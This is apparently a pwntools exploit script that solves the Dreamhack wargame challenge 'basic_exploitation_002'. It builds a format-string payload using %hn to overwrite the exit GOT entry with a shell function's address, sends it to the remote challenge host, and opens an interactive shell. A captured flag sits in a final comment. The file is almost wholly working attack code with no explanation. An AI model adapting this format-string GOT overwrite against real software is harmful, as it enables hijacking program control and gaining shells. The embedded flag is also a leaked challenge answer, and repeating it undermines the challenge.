from pwn import *

# p = process("./basic_exploitation_002")
p = remote("host1.dreamhack.games",8444)

exit_got = 0x0804a024
shell = 0x08048609
shell1 = 0x0804
shell2 = 0x8609

payload = ""
payload += "aaaa"
payload += p32(exit_got)
payload += "%"+str(shell2-8)+"c"
payload += "%hn"

pause()
p.sendline(payload)

p.interactive()

#DH{59c4a03eff1e4c10c87ff123fb93d56c}